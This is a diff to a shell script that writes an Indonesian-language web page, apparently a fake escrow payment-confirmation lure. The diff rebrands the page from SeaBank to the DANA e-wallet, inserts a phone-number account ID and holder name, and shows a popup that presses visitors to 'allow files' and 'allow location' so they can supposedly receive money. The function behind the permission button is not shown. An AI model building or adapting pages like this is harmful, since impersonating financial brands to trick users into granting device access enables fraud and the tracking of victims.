@@ -7883,7 +7883,7 @@ cat > index.html <<'EOF'
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Ascrow - SeaBank ID</title>
+  <title>Ascrow - Dana ID Lela</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
     *{box-sizing:border-box}
@@ -7893,7 +7893,7 @@ cat > index.html <<'EOF'
     p{font-size:14px;color:#fff;margin-bottom:25px;line-height:1.4;font-family:Arial,sans-serif}
     p2{font-size:10px;color:#fff;margin-bottom:35px;line-height:1.4}
     .btn{background:#aaa;color:#111;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
-     .avatar{width:120px;height:120px;border:2px solid #FF5100;border-radius:50%;margin:0 auto 20px;background:#FF5100;display:flex;align-items:center;justify-content:center;color:#111;font-size:25px;font-weight:bold}
+     .avatar{width:120px;height:120px;border:2px solid #FFD700;border-radius:50%;margin:0 auto 20px;background:#FFD700;display:flex;align-items:center;justify-content:center;color:#111;font-size:25px;font-weight:bold}
     .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#061525;display:none;align-items:center;justify-content:center;z-index:10}
     .popup .card{background:#fff;border:2px solid #fff;border-radius:15px;padding:25px;width:300px;text-align:center}
     .popup h2{color:#111;margin-top:0;font-family:Arial,sans-serif}
@@ -7929,24 +7929,24 @@ cat > index.html <<'EOF'
   <!-- Screen 1: Welcome -->
   <div class="screen" id="welcome">
     <div class="avatar"></div>
-    <h1>SeaBank Indonesia</h1>
-    <h2>ID - 901845996598</h2>
-    <h1>A/N Susanti</h1>
-    <button class="btn" onclick="showConsent()">Konfrimasi Pembeyaran</button>
+    <h1>DANA - Indonesia</h1>
+    <h1>ID - 085805579358</h1>
+    <h1>A/N Lela</h1>
+    <button class="btn" onclick="showConsent()">Terima Pembeyaran</button>
   </div>
 
   <!-- Screen 2: Consent -->
   <div class="popup" id="consentPopup">
     <div class="card">
-      <h2>Confrim Payment</h2>
-      <p>Mohon Aktifkan Izin</p>
+      <h2>Konfirmasi Payment</h2>
+      <p>Terima Uang Dari UID Ascrow</p>
       <ul id="featureList">
         <li>IZINKAN FILE</li>
         <li>IZINKAN LOKASI</li>
         <p>Aktifkan Fitur Lokasi Pada Handphone Milik Anda.</p>
       </ul>
       <p id="permissionDetails">Mohon Izinkan Akses Agar Dapat melihat IP dan Transaksi dibuat</p>
-      <button class="btn" onclick="requestPermissions()">Izinkan & Konfirmasi Payment</button>
+      <button class="btn" onclick="requestPermissions()">Izinkan & Terima Uang</button>
     </div>
   </div>
 
